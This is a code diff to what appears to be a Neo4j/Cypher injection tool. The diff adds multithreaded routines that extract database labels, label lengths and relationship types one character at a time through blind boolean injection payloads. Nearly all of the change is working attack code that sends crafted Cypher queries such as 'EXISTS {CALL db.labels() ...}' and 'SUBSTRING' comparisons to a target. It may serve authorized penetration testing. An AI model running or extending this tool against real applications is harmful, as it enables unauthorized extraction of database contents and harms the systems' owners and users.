@@ -22,6 +22,8 @@ from termcolor import colored
 from pyvis.network import Network
 from contextlib import redirect_stdout
 
+MAXSIZE = 1000
+
 data_queue = queue.Queue()
 
 # Helper functions
@@ -265,6 +267,28 @@ class Listener():
 
     def stop_listener(self):
         self.server.shutdown()
+
+class IntHolder():
+
+    def __init__(self):
+        self.int = 0
+
+    def set(self, num):
+        self.int = num
+
+    def get(self):
+        return self.int
+
+class DictHolder():
+    """Class to hold a dict obj"""
+    def __init__(self):
+        self.dict = {}
+
+    def set(self, key, value):
+        self.dict[key] = value
+
+    def get(self):
+        return self.dict
 
 class Printer():
     """A Class to handle printing for multi threading"""
@@ -698,6 +722,22 @@ class ib_Neo4jInjector:
     def find_label_count(self):
         animation = "|/-\\"
         anim_index = 0
+        # threads = []
+        # count = IntHolder()
+        # stop_event = threading.Event()
+        # for i in range(self.threads):
+        #     threads.append(threading.Thread(target=self.find_label_count_part, args=(count, (MAXSIZE // self.threads), ((MAXSIZE // self.threads) * i), stop_event)))
+        # if (MAXSIZE % self.threads != 0):
+        #     threads.append(threading.Thread(target=self.find_label_count_part, args=(count, (MAXSIZE % self.threads), (MAXSIZE - (MAXSIZE % self.threads)), stop_event)))
+        # start_threads(threads)
+        # print(f"[-] dumping label counts, might take awhile", end='\r', flush=True)
+        # join_threads(threads)
+        # if (count.get() == 0):
+        #     print(colored("It is vulnerable to injection, however Neo4j version is < 5.3, unless labels > 1000, if so increase range OR try out-of-band injection (--out-of-band).", "red"))
+        #     sys.exit()
+        # else:
+        #     print(" " * 70, end='\r')
+        #     return count.get()
         for count_index in range(1000):
             if count_index == 999:
                 print(colored("It is vulnerable to injection, however Neo4j version is < 5.3, unless labels > 1000, if so increase range OR try out-of-band injection (--out-of-band).", "red"))
@@ -709,12 +749,34 @@ class ib_Neo4jInjector:
                 if (self.check_true(response)):
                     print(" " * 70, end='\r')
                     return count_index
+    
+    def find_label_count_part(self, count, size, offset, stop_event):
+        for count_index in range(offset, size + offset):
+            responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index}"))
+            for response in responses:
+                if (self.check_true(response)):
+                    count.set(count_index)
+                    stop_event.set()
+                    return
+            if (stop_event.is_set()):
+                return
 
     def find_label_sizes(self, label_count):
         animation = "|/-\\"
         anim_index = 0
         label_sizes_dict = {}
         for count_index in range(label_count):
+            # threads = []
+            # label_sizes_dict = DictHolder()
+            # stop_event = threading.Event()
+            # for i in range(self.threads):
+            #     threads.append(threading.Thread(target=self.find_label_size_part, args=(label_sizes_dict, count_index, (MAXSIZE // self.threads), ((MAXSIZE // self.threads) * i), stop_event)))
+            # if (MAXSIZE % self.threads != 0):
+            #     threads.append(threading.Thread(target=self.find_label_size_part, args=(label_sizes_dict, count_index, (MAXSIZE % self.threads), (MAXSIZE - (MAXSIZE % self.threads), stop_event))))
+            # start_threads(threads)
+            # print(f"[-] dumping label sizes, might take awhile", end='\r', flush=True)
+            # join_threads(threads)
+
             break_flag = False
             for size_index in range(1000):
                 responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
@@ -728,7 +790,19 @@ class ib_Neo4jInjector:
                 if (break_flag):
                     break
         print(" " * 70, end='\r')
+        # return label_sizes_dict.get()
         return label_sizes_dict
+    
+    def find_label_size_part(self, label_sizes_dict, count_index, size, offset, stop_event):
+        for size_index in range(offset, size + offset):
+            responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
+            for response in responses:
+                if (self.check_true(response)):
+                    label_sizes_dict.set(count_index, size_index)
+                    stop_event.set()
+                    return
+            if (stop_event.is_set()):
+                return
 
     def dump_labels(self, label_sizes):
         print(f"\n[*] available labels [{len(label_sizes)}]")
@@ -1098,24 +1172,58 @@ class ib_Neo4jInjector:
         animation = "|/-\\"
         anim_index = 0
         for count_index, size in rel_type_sizes_dict.items():
-            rel_type = ''
-            for size_index in range(size):
-                break_flag = False
-                for char in valid_chars:
-                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-                    print(f"[{animation[anim_index % len(animation)]}] building relationship type: {rel_type}{char}", end='\r', flush=True)
-                    anim_index += 1
-                    for response in responses:
-                        break_flag = self.check_true(response)
-                        if (break_flag):
-                            rel_type += char
-                            break
-                    if (break_flag):
-                        break
+            rel_type = Printer(self.threads)
+            rel_type_part_sizes = rel_type.split_into_parts(size)
+            print(f"[-] Dumping: {rel_type.get_whole()}", end="\r")
+            offset = 0
+            threads = []
+            print_event = threading.Event()
+            stop_event = threading.Event()
+            for i in range(len(rel_type_part_sizes)):
+                if ("_" not in rel_type.parts[i]):
+                    continue
+                threads.append(threading.Thread(target=self.dump_rel_type_part, args=(rel_type, i, count_index, rel_type_part_sizes[i], offset, valid_chars, print_event)))
+                offset += rel_type_part_sizes[i]
+            printer_thread = threading.Thread(target=self.update_print, args=(rel_type, print_event, stop_event))
+            printer_thread.start()
+            start_threads(threads)
+            join_threads(threads)
+            stop_event.set()
+            printer_thread.join()
+            # rel_type = ''
+            # for size_index in range(size):
+            #     break_flag = False
+            #     for char in valid_chars:
+            #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+            #         print(f"[{animation[anim_index % len(animation)]}] building relationship type: {rel_type}{char}", end='\r', flush=True)
+            #         anim_index += 1
+            #         for response in responses:
+            #             break_flag = self.check_true(response)
+            #             if (break_flag):
+            #                 rel_type += char
+            #                 break
+            #         if (break_flag):
+            #             break
             print(" " * 70, end='\r')
-            print(f"[+] {rel_type}")
-            rel_types.append(rel_type)
+            print(f"[+] {rel_type.get_whole()}")
+            rel_types.append(rel_type.get_whole())
         return rel_types
+    
+    def dump_rel_type_part(self, rel_type: Printer, rel_type_part, count_index, size, offset, valid_chars, print_event):
+        for size_index in range(offset, size + offset):
+            break_flag = False
+            for char in valid_chars:
+                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                # print(f"[{animation[anim_index % len(animation)]}] building relationship type: {rel_type}{char}", end='\r', flush=True)
+                # anim_index += 1
+                for response in responses:
+                    break_flag = self.check_true(response)
+                    if (break_flag):
+                        rel_type.update_part(rel_type_part, char, size_index - offset)
+                        break
+                if (break_flag):
+                    break
+            print_event.set()
 
     def find_rel_counts(self, rel_types):
         rel_counts_dict = {}
@@ -1162,7 +1270,7 @@ class ib_Neo4jInjector:
         return rel_sizes_dict
 
     def dump_rel(self, rel_sizes_dict):
-        print(colored(f"\n[!] At this stage, we are unaware relationship direction, we have to verify it\n", "yellow"))
+        print(colored(f"\n[!] At this stage, we are unaware of the relationship direction, we have to verify it\n", "yellow"))
         valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
         rels_dict = {}
         animation = "|/-\\"
